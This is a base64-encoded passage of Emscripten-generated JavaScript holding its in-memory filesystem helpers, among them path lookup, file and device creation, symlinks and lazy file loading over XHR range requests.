IGJhc2UpIHsKICAgICAgICByZXR1cm4gUEFUSC5yZXNvbHZlKGJhc2UsIHJlbGF0aXZlKQogICAgfSksCiAgICBzdGFuZGFyZGl6ZVBhdGg6IChmdW5jdGlvbihwYXRoKSB7CiAgICAgICAgcmV0dXJuIFBBVEgubm9ybWFsaXplKHBhdGgpCiAgICB9KSwKICAgIGZpbmRPYmplY3Q6IChmdW5jdGlvbihwYXRoLCBkb250UmVzb2x2ZUxhc3RMaW5rKSB7CiAgICAgICAgdmFyIHJldCA9IEZTLmFuYWx5emVQYXRoKHBhdGgsIGRvbnRSZXNvbHZlTGFzdExpbmspOwogICAgICAgIGlmKHJldC5leGlzdHMpIHsKICAgICAgICAgICAgcmV0dXJuIHJldC5vYmplY3QKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBfX19zZXRFcnJObyhyZXQuZXJyb3IpOwogICAgICAgICAgICByZXR1cm4gbnVsbAogICAgICAgIH0KICAgIH0pLAogICAgYW5hbHl6ZVBhdGg6IChmdW5jdGlvbihwYXRoLCBkb250UmVzb2x2ZUxhc3RMaW5rKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge2ZvbGxvdzogIWRvbnRSZXNvbHZlTGFzdExpbmt9KTsKICAgICAgICAgICAgcGF0aCA9IGxvb2t1cC5wYXRoCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgfQogICAgICAgIHZhciByZXQgPSB7CiAgICAgICAgICAgIGlzUm9vdDogZmFsc2UsCiAgICAgICAgICAgIGV4aXN0czogZmFsc2UsCiAgICAgICAgICAgIGVycm9yOiAwLAogICAgICAgICAgICBuYW1lOiBudWxsLAogICAgICAgICAgICBwYXRoOiBudWxsLAogICAgICAgICAgICBvYmplY3Q6IG51bGwsCiAgICAgICAgICAgIHBhcmVudEV4aXN0czogZmFsc2UsCiAgICAgICAgICAgIHBhcmVudFBhdGg6IG51bGwsCiAgICAgICAgICAgIHBhcmVudE9iamVjdDogbnVsbAogICAgICAgIH07CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge3BhcmVudDogdHJ1ZX0pOwogICAgICAgICAgICByZXQucGFyZW50RXhpc3RzID0gdHJ1ZTsKICAgICAgICAgICAgcmV0LnBhcmVudFBhdGggPSBsb29rdXAucGF0aDsKICAgICAgICAgICAgcmV0LnBhcmVudE9iamVjdCA9IGxvb2t1cC5ub2RlOwogICAgICAgICAgICByZXQubmFtZSA9IFBBVEguYmFzZW5hbWUocGF0aCk7CiAgICAgICAgICAgIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge2ZvbGxvdzogIWRvbnRSZXNvbHZlTGFzdExpbmt9KTsKICAgICAgICAgICAgcmV0LmV4aXN0cyA9IHRydWU7CiAgICAgICAgICAgIHJldC5wYXRoID0gbG9va3VwLnBhdGg7CiAgICAgICAgICAgIHJldC5vYmplY3QgPSBsb29rdXAubm9kZTsKICAgICAgICAgICAgcmV0Lm5hbWUgPSBsb29rdXAubm9kZS5uYW1lOwogICAgICAgICAgICByZXQuaXNSb290ID0gbG9va3VwLnBhdGggPT09ICIvIgogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICByZXQuZXJyb3IgPSBlLmVycm5vCiAgICAgICAgfQogICAgICAgIHJldHVybiByZXQKICAgIH0pLAogICAgY3JlYXRlRm9sZGVyOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBjYW5SZWFkLCBjYW5Xcml0ZSkgewogICAgICAgIHZhciBwYXRoID0gUEFUSC5qb2luMih0eXBlb2YgcGFyZW50ID09PSAic3RyaW5nIiA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KSwgbmFtZSk7CiAgICAgICAgdmFyIG1vZGUgPSBGUy5nZXRNb2RlKGNhblJlYWQsIGNhbldyaXRlKTsKICAgICAgICByZXR1cm4gRlMubWtkaXIocGF0aCwgbW9kZSkKICAgIH0pLAogICAgY3JlYXRlUGF0aDogKGZ1bmN0aW9uKHBhcmVudCwgcGF0aCwgY2FuUmVhZCwgY2FuV3JpdGUpIHsKICAgICAgICBwYXJlbnQgPSB0eXBlb2YgcGFyZW50ID09PSAic3RyaW5nIiA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KTsKICAgICAgICB2YXIgcGFydHMgPSBwYXRoLnNwbGl0KCIvIikucmV2ZXJzZSgpOwogICAgICAgIHdoaWxlKHBhcnRzLmxlbmd0aCkgewogICAgICAgICAgICB2YXIgcGFydCA9IHBhcnRzLnBvcCgpOwogICAgICAgICAgICBpZighcGFydCkgY29udGludWU7CiAgICAgICAgICAgIHZhciBjdXJyZW50ID0gUEFUSC5qb2luMihwYXJlbnQsIHBhcnQpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgRlMubWtkaXIoY3VycmVudCkKICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGFyZW50ID0gY3VycmVudAogICAgICAgIH0KICAgICAgICByZXR1cm4gY3VycmVudAogICAgfSksCiAgICBjcmVhdGVGaWxlOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBwcm9wZXJ0aWVzLCBjYW5SZWFkLCBjYW5Xcml0ZSkgewogICAgICAgIHZhciBwYXRoID0gUEFUSC5qb2luMih0eXBlb2YgcGFyZW50ID09PSAic3RyaW5nIiA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KSwgbmFtZSk7CiAgICAgICAgdmFyIG1vZGUgPSBGUy5nZXRNb2RlKGNhblJlYWQsIGNhbldyaXRlKTsKICAgICAgICByZXR1cm4gRlMuY3JlYXRlKHBhdGgsIG1vZGUpCiAgICB9KSwKICAgIGNyZWF0ZURhdGFGaWxlOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBkYXRhLCBjYW5SZWFkLCBjYW5Xcml0ZSwgY2FuT3duKSB7CiAgICAgICAgdmFyIHBhdGggPSBuYW1lID8gUEFUSC5qb2luMih0eXBlb2YgcGFyZW50ID09PSAic3RyaW5nIiA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KSwgbmFtZSkgOiBwYXJlbnQ7CiAgICAgICAgdmFyIG1vZGUgPSBGUy5nZXRNb2RlKGNhblJlYWQsIGNhbldyaXRlKTsKICAgICAgICB2YXIgbm9kZSA9IEZTLmNyZWF0ZShwYXRoLCBtb2RlKTsKICAgICAgICBpZihkYXRhKSB7CiAgICAgICAgICAgIGlmKHR5cGVvZiBkYXRhID09PSAic3RyaW5nIikgewogICAgICAgICAgICAgICAgdmFyIGFyciA9IG5ldyBBcnJheShkYXRhLmxlbmd0aCk7CiAgICAgICAgICAgICAgICBmb3IodmFyIGkgPSAwLCBsZW4gPSBkYXRhLmxlbmd0aDsgaSA8IGxlbjsgKytpKSBhcnJbaV0gPSBkYXRhLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgICAgICBkYXRhID0gYXJyCiAgICAgICAgICAgIH0KICAgICAgICAgICAgRlMuY2htb2Qobm9kZSwgbW9kZSB8IDE0Nik7CiAgICAgICAgICAgIHZhciBzdHJlYW0gPSBGUy5vcGVuKG5vZGUsICJ3Iik7CiAgICAgICAgICAgIEZTLndyaXRlKHN0cmVhbSwgZGF0YSwgMCwgZGF0YS5sZW5ndGgsIDAsIGNhbk93bik7CiAgICAgICAgICAgIEZTLmNsb3NlKHN0cmVhbSk7CiAgICAgICAgICAgIEZTLmNobW9kKG5vZGUsIG1vZGUpCiAgICAgICAgfQogICAgICAgIHJldHVybiBub2RlCiAgICB9KSwKICAgIGNyZWF0ZURldmljZTogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgaW5wdXQsIG91dHB1dCkgewogICAgICAgIHZhciBwYXRoID0gUEFUSC5qb2luMih0eXBlb2YgcGFyZW50ID09PSAic3RyaW5nIiA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KSwgbmFtZSk7CiAgICAgICAgdmFyIG1vZGUgPSBGUy5nZXRNb2RlKCEhaW5wdXQsICEhb3V0cHV0KTsKICAgICAgICBpZighRlMuY3JlYXRlRGV2aWNlLm1ham9yKSBGUy5jcmVhdGVEZXZpY2UubWFqb3IgPSA2NDsKICAgICAgICB2YXIgZGV2ID0gRlMubWFrZWRldihGUy5jcmVhdGVEZXZpY2UubWFqb3IrKywgMCk7CiAgICAgICAgRlMucmVnaXN0ZXJEZXZpY2UoZGV2LCB7CiAgICAgICAgICAgIG9wZW46IChmdW5jdGlvbihzdHJlYW0pIHsKICAgICAgICAgICAgICAgIHN0cmVhbS5zZWVrYWJsZSA9IGZhbHNlCiAgICAgICAgICAgIH0pLCBjbG9zZTogKGZ1bmN0aW9uKHN0cmVhbSkgewogICAgICAgICAgICAgICAgaWYob3V0cHV0ICYmIG91dHB1dC5idWZmZXIgJiYgb3V0cHV0LmJ1ZmZlci5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBvdXRwdXQoMTApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pLCByZWFkOiAoZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3MpIHsKICAgICAgICAgICAgICAgIHZhciBieXRlc1JlYWQgPSAwOwogICAgICAgICAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IGxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIHJlc3VsdDsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBpbnB1dCgpCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYocmVzdWx0ID09PSB1bmRlZmluZWQgJiYgYnl0ZXNSZWFkID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVBR0FJTikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYocmVzdWx0ID09PSBudWxsIHx8IHJlc3VsdCA9PT0gdW5kZWZpbmVkKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBieXRlc1JlYWQrKzsKICAgICAgICAgICAgICAgICAgICBidWZmZXJbb2Zmc2V0ICsgaV0gPSByZXN1bHQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKGJ5dGVzUmVhZCkgewogICAgICAgICAgICAgICAgICAgIHN0cmVhbS5ub2RlLnRpbWVzdGFtcCA9IERhdGUubm93KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiBieXRlc1JlYWQKICAgICAgICAgICAgfSksIHdyaXRlOiAoZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3MpIHsKICAgICAgICAgICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dChidWZmZXJbb2Zmc2V0ICsgaV0pCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZihsZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBzdHJlYW0ubm9kZS50aW1lc3RhbXAgPSBEYXRlLm5vdygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gaQogICAgICAgICAgICB9KQogICAgICAgIH0pOwogICAgICAgIHJldHVybiBGUy5ta2RldihwYXRoLCBtb2RlLCBkZXYpCiAgICB9KSwKICAgIGNyZWF0ZUxpbms6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUsIHRhcmdldCwgY2FuUmVhZCwgY2FuV3JpdGUpIHsKICAgICAgICB2YXIgcGF0aCA9IFBBVEguam9pbjIodHlwZW9mIHBhcmVudCA9PT0gInN0cmluZyIgPyBwYXJlbnQgOiBGUy5nZXRQYXRoKHBhcmVudCksIG5hbWUpOwogICAgICAgIHJldHVybiBGUy5zeW1saW5rKHRhcmdldCwgcGF0aCkKICAgIH0pLAogICAgZm9yY2VMb2FkRmlsZTogKGZ1bmN0aW9uKG9iaikgewogICAgICAgIGlmKG9iai5pc0RldmljZSB8fCBvYmouaXNGb2xkZXIgfHwgb2JqLmxpbmsgfHwgb2JqLmNvbnRlbnRzKSByZXR1cm4gdHJ1ZTsKICAgICAgICB2YXIgc3VjY2VzcyA9IHRydWU7CiAgICAgICAgaWYodHlwZW9mIFhNTEh0dHBSZXF1ZXN0ICE9PSAidW5kZWZpbmVkIikgewogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIkxhenkgbG9hZGluZyBzaG91bGQgaGF2ZSBiZWVuIHBlcmZvcm1lZCAoY29udGVudHMgc2V0KSBpbiBjcmVhdGVMYXp5RmlsZSwgYnV0IGl0IHdhcyBub3QuIExhenkgbG9hZGluZyBvbmx5IHdvcmtzIGluIHdlYiB3b3JrZXJzLiBVc2UgLS1lbWJlZC1maWxlIG9yIC0tcHJlbG9hZC1maWxlIGluIGVtY2Mgb24gdGhlIG1haW4gdGhyZWFkLiIpCiAgICAgICAgfSBlbHNlIGlmKE1vZHVsZVsicmVhZCJdKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBvYmouY29udGVudHMgPSBpbnRBcnJheUZyb21TdHJpbmcoTW9kdWxlWyJyZWFkIl0ob2JqLnVybCksIHRydWUpOwogICAgICAgICAgICAgICAgb2JqLnVzZWRCeXRlcyA9IG9iai5jb250ZW50cy5sZW5ndGgKICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICBzdWNjZXNzID0gZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigiQ2Fubm90IGxvYWQgd2l0aG91dCByZWFkKCkgb3IgWE1MSHR0cFJlcXVlc3QuIikKICAgICAgICB9CiAgICAgICAgaWYoIXN1Y2Nlc3MpIF9fX3NldEVyck5vKEVSUk5PX0NPREVTLkVJTyk7CiAgICAgICAgcmV0dXJuIHN1Y2Nlc3MKICAgIH0pLAogICAgY3JlYXRlTGF6eUZpbGU6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUsIHVybCwgY2FuUmVhZCwgY2FuV3JpdGUpIHsKICAgICAgICBmdW5jdGlvbiBMYXp5VWludDhBcnJheSgpIHsKICAgICAgICAgICAgdGhpcy5sZW5ndGhLbm93biA9IGZhbHNlOwogICAgICAgICAgICB0aGlzLmNodW5rcyA9IFtdCiAgICAgICAgfQoKICAgICAgICBMYXp5VWludDhBcnJheS5wcm90b3R5cGUuZ2V0ID0gZnVuY3Rpb24gTGF6eVVpbnQ4QXJyYXlfZ2V0KGlkeCkgewogICAgICAgICAgICBpZihpZHggPiB0aGlzLmxlbmd0aCAtIDEgfHwgaWR4IDwgMCkgewogICAgICAgICAgICAgICAgcmV0dXJuIHVuZGVmaW5lZAogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBjaHVua09mZnNldCA9IGlkeCAlIHRoaXMuY2h1bmtTaXplOwogICAgICAgICAgICB2YXIgY2h1bmtOdW0gPSBpZHggLyB0aGlzLmNodW5rU2l6ZSB8IDA7CiAgICAgICAgICAgIHJldHVybiB0aGlzLmdldHRlcihjaHVua051bSlbY2h1bmtPZmZzZXRdCiAgICAgICAgfTsKICAgICAgICBMYXp5VWludDhBcnJheS5wcm90b3R5cGUuc2V0RGF0YUdldHRlciA9IGZ1bmN0aW9uIExhenlVaW50OEFycmF5X3NldERhdGFHZXR0ZXIoZ2V0dGVyKSB7CiAgICAgICAgICAgIHRoaXMuZ2V0dGVyID0gZ2V0dGVyCiAgICAgICAgfTsKICAgICAgICBMYXp5VWludDhBcnJheS5wcm90b3R5cGUuY2FjaGVMZW5ndGggPSBmdW5jdGlvbiBMYXp5VWludDhBcnJheV9jYWNoZUxlbmd0aCgpIHsKICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdDsKICAgICAgICAgICAgeGhyLm9wZW4oIkhFQUQiLCB1cmwsIGZhbHNlKTsKICAgICAgICAgICAgeGhyLnNlbmQobnVsbCk7CiAgICAgICAgICAgIGlmKCEoeGhyLnN0YXR1cyA+PSAyMDAgJiYgeGhyLnN0YXR1cyA8IDMwMCB8fCB4aHIuc3RhdHVzID09PSAzMDQpKSB0aHJvdyBuZXcgRXJyb3IoIkNvdWxkbid0IGxvYWQgIiArIHVybCArICIuIFN0YXR1czogIiArIHhoci5zdGF0dXMpOwogICAgICAgICAgICB2YXIgZGF0YWxlbmd0aCA9IE51bWJlcih4aHIuZ2V0UmVzcG9uc2VIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIikpOwogICAgICAgICAgICB2YXIgaGVhZGVyOwogICAgICAgICAgICB2YXIgaGFzQnl0ZVNlcnZpbmcgPSAoaGVhZGVyID0geGhyLmdldFJlc3BvbnNlSGVhZGVyKCJBY2NlcHQtUmFuZ2VzIikpICYmIGhlYWRlciA9PT0gImJ5dGVzIjsKICAgICAgICAgICAgdmFyIHVzZXNHemlwID0gKGhlYWRlciA9IHhoci5nZXRSZXNwb25zZUhlYWRlcigiQ29udGVudC1FbmNvZGluZyIpKSAmJiBoZWFkZXIgPT09ICJnemlwIjsKICAgICAgICAgICAgdmFyIGNodW5rU2l6ZSA9IDEwMjQgKiAxMDI0OwogICAgICAgICAgICBpZighaGFzQnl0ZVNlcnZpbmcpIGNodW5rU2l6ZSA9IGRhdGFsZW5ndGg7CiAgICAgICAgICAgIHZhciBkb1hIUiA9IChmdW5jdGlvbihmcm9tLCB0bykgewogICAgICAgICAgICAgICAgaWYoZnJvbSA+IHRvKSB0aHJvdyBuZXcgRXJyb3IoImludmFsaWQgcmFuZ2UgKCIgKyBmcm9tICsgIiwgIiArIHRvICsgIikgb3Igbm8gYnl0ZXMgcmVxdWVzdGVkISIpOwogICAgICAgICAgICAgICAgaWYodG8gPiBkYXRhbGVuZ3RoIC0gMSkgdGhyb3cgbmV3IEVycm9yKCJvbmx5ICIgKyBkYXRhbGVuZ3RoICsgIiBieXRlcyBhdmFpbGFibGUhIHByb2dyYW1tZXIgZXJyb3IhIik7CiAgICAgICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0OwogICAgICAgICAgICAgICAgeGhyLm9wZW4oIkdFVCIsIHVybCwgZmFsc2UpOwogICAgICAgICAgICAgICAgaWYoZGF0YWxlbmd0aCAhPT0gY2h1bmtTaXplKSB4aHIuc2V0UmVxdWVzdEhlYWRlcigiUmFuZ2UiLCAiYnl0ZXM9IiArIGZyb20gKyAiLSIgKyB0byk7CiAgICAgICAgICAgICAgICBpZih0eXBlb2YgVWludDhBcnJheSAhPSAidW5kZWZpbmVkIikgeGhyLnJlc3BvbnNlVHlwZSA9ICJhcnJheWJ1ZmZlciI7CiAgICAgICAgICAgICAgICBpZih4aHIub3ZlcnJpZGVNaW1lVHlwZSkgewogICAgICAgICAgICAgICAgICAgIHhoci5vdmVycmlkZU1pbWVUeXBlKCJ0ZXh0L3BsYWluOyBjaGFyc2V0PXgtdXNlci1kZWZpbmVkIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHhoci5zZW5kKG51bGwpOwogICAgICAgICAgICAgICAgaWYoISh4aHIuc3RhdHVzID49IDIwMCAmJiB4aHIuc3RhdHVzIDwgMzAwIHx8IHhoci5zdGF0dXMgPT09IDMwNCkpIHRocm93IG5ldyBFcnJvcigiQ291bGRuJ3QgbG9hZCAiICsgdXJsICsgIi4gU3RhdHVzOiAiICsgeGhyLnN0YXR1cyk7CiAgICAgICAgICAgICAgICBpZih4aHIucmVzcG9uc2UgIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgVWludDhBcnJheSh4aHIucmVzcG9uc2UgfHwgW10pCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBpbnRBcnJheUZyb21TdHJpbmcoeGhyLnJlc3BvbnNlVGV4dCB8fCAiIiwgdHJ1ZSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIHZhciBsYXp5QXJyYXkgPSB0aGlzOwogICAgICAgICAgICBsYXp5QXJyYXkuc2V0RGF0YUdldHRlcigoZnVuY3Rpb24oY2h1bmtOdW0pIHsKICAgICAgICAgICAgICAgIHZhciBzdGFydCA9IGNodW5rTnVtICogY2h1bmtTaXplOwogICAgICAgICAgICAgICAgdmFyIGVuZCA9IChjaHVua051bSArIDEpICogY2h1bmtTaXplIC0gMTsKICAgICAgICAgICAgICAgIGVuZCA9IE1hdGgubWluKGVuZCwgZGF0YWxlbmd0aCAtIDEpOwogICAgICAgICAgICAgICAgaWYodHlwZW9mIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dID09PSAidW5kZWZpbmVkIikgewogICAgICAgICAgICAgICAgICAgIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dID0gZG9YSFIoc3RhcnQsIGVuZCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKHR5cGVvZiBsYXp5QXJyYXkuY2h1bmtzW2NodW5rTnVtXSA9PT0gInVuZGVmaW5lZCIpIHRocm93IG5ldyBFcnJvcigiZG9YSFIgZmFpbGVkISIpOwogICAgICAgICAgICAgICAgcmV0dXJuIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dCiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgaWYodXNlc0d6aXAgfHwgIWRhdGFsZW5ndGgpIHsKICAgICAgICAgICAgICAgIGNodW5rU2l6ZSA9IGRhdGFsZW5ndGggPSAxOwogICAgICAgICAgICAgICAgZGF0YWxlbmd0aCA9IHRoaXMuZ2V0dGVyKDApLmxlbmd0aDsKICAgICAgICAgICAgICAgIGNodW5rU2l6ZSA9IGRhdGFsZW5ndGg7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiTGF6eUZpbGVzIG9uIGd6aXAgZm9yY2VzIGRvd25sb2FkIG9mIHRoZSB3aG9sZSBmaWxlIHdoZW4gbGVuZ3RoIGlzIGFjY2Vzc2VkIikKICAgICAgICAgICAgfQogICAgICAgICAgICB0aGlzLl9sZW5ndGggPSBkYXRhbGVuZ3RoOwogICAgICAgICAgICB0aGlzLl9jaHVua1NpemUgPSBjaHVua1NpemU7CiAgICAgICAgICAgIHRoaXMubGVuZ3RoS25vd24gPSB0cnVlCiAgICAgICAgfTsKICAgICAgICBpZih0eXBlb2YgWE1MSHR0cFJlcXVlc3QgIT09ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgICAgIGlmKCFFTlZJUk9OTUVOVF9JU19XT1JLRVIpIHRocm93IkNhbm5vdCBkbyBzeW5jaHJvbm91cyBiaW5hcnkgWEhScyBvdXRzaWRlIHdlYndvcmtlcnMgaW4gbW9kZXJuIGJyb3dzZXJzLiBVc2UgLS1lbWJlZC1maWxlIG9yIC0tcHJlbG9hZC1maWxlIGluIGVtY2MiOwogICAgICAgICAgICB2YXIgbGF6eUFycmF5ID0gbmV3IExhenlVaW50OEFycmF5OwogICAgICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydGllcyhsYXp5QXJyYXksIHsKICAgICAgICAgICAgICAgIGxlbmd0aDogewogICAgICAgICAgICAgICAgICAgIGdldDogKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZighdGhpcy5sZW5ndGhLbm93bikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5jYWNoZUxlbmd0aCgpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMuX2xlbmd0aAogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9LCBjaHVua1NpemU6IHsKICAgICAgICAgICAgICAgICAgICBnZXQ6IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoIXRoaXMubGVuZ3RoS25vd24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuY2FjaGVMZW5ndGgoKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLl9jaHVua1NpemUKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgdmFyIHByb3BlcnRpZXMgPSB7aXNEZXZpY2U6IGZhbHNlLCBjb250ZW50czogbGF6eUFycmF5fQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHZhciBwcm9wZXJ0aWVzID0ge2lzRGV2aWNlOiBmYWxzZSwgdXJsOiB1cmx9CiAgICAgICAgfQogICAgICAgIHZhciBub2RlID0gRlMuY3JlYXRlRmlsZShwYXJlbnQsIG5hbWUsIHByb3BlcnRpZXMsIGNhblJlYWQsIGNhbldyaXRlKTsKICAgICAgICBpZihwcm9wZXJ0aWVzLmNvbnRlbnRzKSB7CiAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSBwcm9wZXJ0aWVzLmNvbnRlbnRzCiAgICAgICAgfSBlbHNlIGlmKHByb3BlcnRpZXMudXJsKSB7CiAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSBudWxsOwogICAgICAgICAgICBub2RlLnVybCA9IHByb3BlcnRpZXMudXJsCiAgICAgICAgfQogICAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0aWVzKG5vZGUsIHsKICAgICAgICAgICAgdXNlZEJ5dGVzOiB7CiAgICAgICAgICAgICAgICBnZXQ6IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5jb250ZW50cy5sZW5ndGgKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICB2YXIgc3RyZWFtX29wcyA9IHt9OwogICAgICAgIHZhciBrZXlzID0gT2JqZWN0LmtleXMobm9kZS5zdHJlYW1fb3BzKTsKICAgICAgICBrZXlzLmZvckVhY2goKGZ1bmN0aW9uKGtleSkgewogICAgICAgICAgICB2YXIgZm4gPSBub2RlLnN0cmVhbV9vcHNba2V5XTsKICAgICAgICAgICAgc3RyZWFtX29wc1trZXldID0gZnVuY3Rpb24gZm9yY2VMb2FkTGF6eUZpbGUoKSB7CiAgICAgICAgICAgICAgICBpZighRlMuZm9yY2VMb2FkRmlsZShub2RlKSkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiBmbi5hcHBseShudWxsLCBhcmd1bWVudHMpCiAgICAgICAgICAgIH0KICAgICAgICB9KSk7CiAgICAgICAgc3RyZWFtX29wcy5yZWFkID0gZnVuY3Rpb24gc3RyZWFtX29wc19yZWFkKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pIHsKICAgICAgICAgICAgaWYoIUZTLmZvcmNlTG9hZEZpbGUobm9kZSkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTykKICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgY29udGVudHMgPSBzdHJlYW0ubm9kZS5jb250ZW50czsKICAgICAgICAgICAgaWYocG9zaXRpb24gPj0gY29udGVudHMubGVuZ3RoKSByZXR1cm4gMDsKICAgICAgICAgICAgdmFyIHNpemUgPSBNYXRoLm1pbihjb250ZW50cy5sZW5ndGggLSBwb3NpdGlvbiwgbGVuZ3RoKTsKICAgICAgICAgICAgYXNzZXJ0KHNpemUgPj0gMCk7CiAgICAgICAgICAgIGlmKGNvbnRlbnRzLnNsaWNlKSB7CiAgICAgICAgICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgc2l6ZTsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgYnVmZmVyW29mZnNldCArIGldID0gY29udGVudHNbcG9zaXRpb24gKyBpXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IHNpemU7IGkrKykgewogICAgICAgICAgICAgICAgICAgIGJ1ZmZlcltvZmZzZXQgKyBpXSA9IGNvbnRlbnRzLmdldChwb3NpdGlvbiArIGkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHNpemUKICAgICAgICB9OwogICAgICAgIG5vZGUuc3RyZWFtX29wcyA9IHN0cmVhbV9vcHM7CiAgICAgICAgcmV0dXJuIG5vZGUKICAgIH0pLAogICAgY3JlYXRlUHJlbG9hZGV